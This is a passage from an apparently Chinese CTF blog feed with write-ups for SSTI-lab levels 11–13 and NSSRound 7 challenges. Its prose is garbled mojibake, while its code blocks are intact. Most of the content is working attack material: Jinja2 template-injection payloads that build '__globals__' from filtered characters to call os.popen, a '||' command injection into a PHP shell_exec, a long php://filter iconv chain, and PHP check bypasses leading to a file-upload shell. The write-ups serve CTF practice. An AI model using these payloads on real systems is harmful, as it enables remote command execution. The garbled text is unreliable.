class="line">&#123;% set r=dict(read=1) | join %&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶payloadä¸º<br><code>&#123;&#123;lipsum|attr("__globals__")|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>ç„¶åå†æ„é€ <code>&quot;__globals__&quot;</code><br>å…ˆçœ‹ä¸‹åˆ’çº¿æ„é€ æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ä¸‹åˆ’çº¿å’Œglobalsæ‹¼æ¥èµ‹å€¼ç»™globalå½¢æˆ<code>&quot;__globals__&quot;</code><br><code>&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</code><br>æ­¤æ—¶payloadä¸º<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>ç„¶åå†æ„é€ <code>&quot;type flag&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br></pre></td></tr></table></figure><p>ä¸­é—´æœ‰ä¸ªç©ºæ ¼ï¼Œæ„é€ ä¸ªç©ºæ ¼<br><code>&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</code><br>ç„¶åæ‹¼æ¥èµ‹å€¼ç»™ä¸€ä¸ªæ–°å˜é‡<br><code>&#123;% set cmd=(t,space,f)|join%&#125;</code><br>åˆ°è¿™é‡Œæ„é€ å®Œæˆï¼Œæ­¤æ—¶çš„payloadä¸º<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</code><br>ç„¶åç»¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058439.png" alt="image-20230328105827313"></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†ä¸‹åˆ’çº¿<code>_</code>,ç‚¹<code>.</code>,æ•°å­—<code>0-9</code>,åæ–œæ <code>\</code>,å•å¼•å·<code>&#39;</code>,åŒå¼•å·<code>&quot;</code>,æ–¹æ‹¬å·<code>[]</code><br>å°±æ‹¿ä¸Šé¢˜çš„payloadï¼Œåªä¸è¿‡éœ€è¦åŠ ä¸Š9å’Œ18çš„æ„é€ ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªæ•°å­—è¢«è¿‡æ»¤æ— æ³•ç›´æ¥ä½¿ç”¨ä¸‹æ ‡<br>å­—ç¬¦ä¸²åˆ—è¡¨è·å–å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å†å¼„äº†<br>æ€è·¯å°±æ˜¯åˆ©ç”¨å‡½æ•°indexæ¥è·å–ç´¢å¼•ä½ç½®çš„æ•°å­—ï¼Œç„¶ååˆ©ç”¨æ•°å­—ç›¸ä¹˜å¾—åˆ°9å’Œ18ï¼Œè¿™é‡Œä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†ï¼Œä¸ç„¶å¯ä»¥ç›´æ¥å¾—åˆ°18<br>å…ˆæ„é€ indexå‡½æ•°<br><code>&#123;% set index=dict(index=a)|join %&#125;</code><br>ç„¶åè·å–2å’Œ3ï¼Œé€šè¿‡<code>2*3*3</code>å’Œ<code>3*3</code>å¾—åˆ°9å’Œ18</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set u=dict(u=a)|join %&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join %&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n) %&#125;</span><br></pre></td></tr></table></figure><p>åŠ ä¸Š11å…³çš„payloadï¼Œå°†æ•°å­—æ›¿æ¢å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set index=dict(index=a)|join%&#125;</span><br><span class="line">&#123;% set u=dict(u=a)|join%&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u)%&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n)%&#125;</span><br><span class="line">&#123;% set g=dict(get=a)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=a)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(two*three*three)%&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=a)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=a)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=a)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(three*three)%&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058125.png" alt="image-20230328105842324"></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>_</code>,ç‚¹<code>.</code>,åæ–œæ <code>\</code>,å•å¼•å·<code>&#39;</code>,åŒå¼•å·<code>&quot;</code>,æ–¹æ‹¬å·<code>[]</code>,åŠ å·<code>+</code>,ä»¥åŠä¸€äº›å…³é”®å­—<br><code>&#39;class&#39;</code>, <code>&#39;init&#39;</code>, <code>&#39;arg&#39;</code>, <code>&#39;config&#39;</code>, <code>&#39;app&#39;</code>, <code>&#39;self&#39;</code><br>ä½†æ˜¯11å…³çš„payloadåˆšåˆšå¥½é¿å¼€äº†ï¼Œæ‰€ä»¥ç›´æ¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058257.png" alt="image-20230328105854397"></p><p>å‚è€ƒï¼š<br><a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/#toc-head-12">SSTI-Labsé¶åœº - o2takuXX ã® blogo2takuXX ã® blog</a><br><a href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LABæ”»ç•¥ â€“ JohnFrodâ€™s Blog</a><br><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰_sstiç»•è¿‡_yu22xçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">SSTIè¿›é˜¶ | æ²‰é“æ±¤çš„ç ´ç«™ (chenlvtang.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 7 Teamå¤ç°</title>
      <link href="/2023/02/NSSRound-7-Team%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/NSSRound-7-Team%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ec-RCE"><a href="#ec-RCE" class="headerlink" title="ec_RCE"></a>ec_RCE</h1><p>ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„é¢˜ï¼Œä½†æ˜¯éœ€è¦çœ‹æ‡‚ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By æ¢å§¬ --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ä¸ªæ¯”è¾ƒå¤æ‚çš„javaé¢˜ï¼Œä¸€è¡€ä¹Ÿæ²¡æœ‰äº†å°±ç›´æ¥è·³äº†ï¼Œä¸‹é¢çš„shell_execåé¢æ˜¯æ‰§è¡Œjaræ–‡ä»¶ï¼Œactionå’Œdataå¯æ§ç›´æ¥åˆ©ç”¨<code>||</code>æ‹¼æ¥ä¸€æ¡catå‘½ä»¤å³å¯</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262153808.png" alt="image-20230226215332433"></p><h1 id="0o0"><a href="#0o0" class="headerlink" title="0o0"></a>0o0</h1><p>ç›´æ¥F12å¯ä»¥çœ‹åˆ°ä¸€ä¸ªgetå‚æ•°ï¼Œå½“ç„¶æŠ“åŒ…ä¹Ÿè¡Œ</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156758.png" alt="image-20230226215602606"></p><p>ç„¶åä¼ å‚å‘ç°ä¸‹é¢æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;get:S0uRc3&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;Round7/&#x27;</span>);  </span><br><span class="line"><span class="comment">// include: Nss  </span></span><br><span class="line"><span class="comment">// include: level2  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>])) &#123;    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>],<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Round7&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NO!!!!!   Permission denied!&#x27;</span>);   </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Xy1on&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">        <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Nothing!!!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;S0uRc3&#x27;</span>]))&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;CTF&#x27;</span>,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nothing here&quot;</span>;  </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨0çš„ä½ç½®ä¸Šéœ€è¦åŒ¹é…åˆ°Xy1onï¼Œåˆ©ç”¨å·¥å…·åˆ¶ä½œfilteré“¾ç»•è¿‡ï¼Œ<a href="https://github.com/synacktiv/php_filter_chain_generator">å·¥å…·åœ°å€</a>è¿™é‡Œéœ€è¦æ³¨æ„åœ¨Linuxä¸‹è¿è¡Œå¹¶ä¸”Xy1onåé¢è¦æœ‰ä¸ªç©ºæ ¼ï¼Œå¦åˆ™ä¼šå‡ºç°ä¹±ç ï¼Œåœ¨Windowsä¸‹åŠ ç©ºæ ¼å°±ä¼šæŠ¥é”™ï¼Œè®¿é—®level2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=level2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156261.png" alt="image-20230226215633307"></p><p>è¿›å…¥Ns_SCtF.phpæ‹¿åˆ°æºç ï¼Œè¿™é‡Œå…¶å®ä¸€å¼€å§‹æ‰«ç›®å½•çš„è¯ä¼šæ‰«åˆ°ä¸€ä¸ªDS_Storeï¼Œè¿›å»ä¼šå‘ç°èƒ½ç›´æ¥çœ‹åˆ°Ns_SCtF.phpåªæ˜¯éœ€è¦åˆ æ‰ç©ºæ ¼ï¼Œè¿™æ ·å°±çœç•¥äº†ä¸Šé¢çš„æ­¥éª¤ï¼Œç›´æ¥æ¥åˆ°æœ€åä¸€æ­¥ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157980.png" alt="image-20230226215717918"></p><p>ç„¶åå†çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç»•è¿‡ç›´æ¥çœ‹wpè§£é‡Šï¼ŒæŒºè¯¦ç»†çš„æ‡’å¾—å†™äº†<br><code>é¦–å…ˆæ˜¯å„è‡ªç»•è¿‡ï¼Œç¬¬ä¸€å±‚æ•°ç»„ç»•è¿‡ï¼ŒNSSCTF[]=1&amp;NSSCTF[]=2ï¼Œç¬¬äºŒå±‚æ˜¯in_array()ç¬¬ä¸‰ä¸ªå‚æ•°æ²¡æœ‰ç›´æ¥strictå¯¼è‡´å¯ä»¥ç»•è¿‡ï¼ŒNsScTF=1qï¼Œç¬¬ä¸‰å±‚æ˜¯ä¼ªåè®®NsScTf=data://text/plain,Welcome to Round7!!!ï¼Œç¬¬å››å±‚nss_ctfer.vipæ³¨æ„å˜ä¸ºnss[ctfer.vip(å› ä¸ºPHPåŒ¹é…çš„æ—¶å€™ä¼šè‡ªåŠ¨å°†[.å˜æˆä¸‹åˆ’çº¿ï¼Œæœ‰ä¸”ä»…å˜ä¸€æ¬¡)ï¼Œç¬¬äº”å±‚æ˜¯intval()ç»•è¿‡ï¼Œå­—ç¬¦ä¸²ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¼šé»˜è®¤æ˜¯å‰é¢çš„æ•°å­—ï¼Œæ¯”å¦‚â€™1e1â€™è½¬åŒ–å˜æˆ1ï¼ŒNSScTf=114514e1ï¼Œç¬¬äº”å±‚ç›´æ¥nSScTF=1ï¼Œ$nSscTF=NSSRound7ã€‚è¿™é‡Œçš„å…³é”®æ˜¯æ–‡ä»¶ä¸Šä¼ 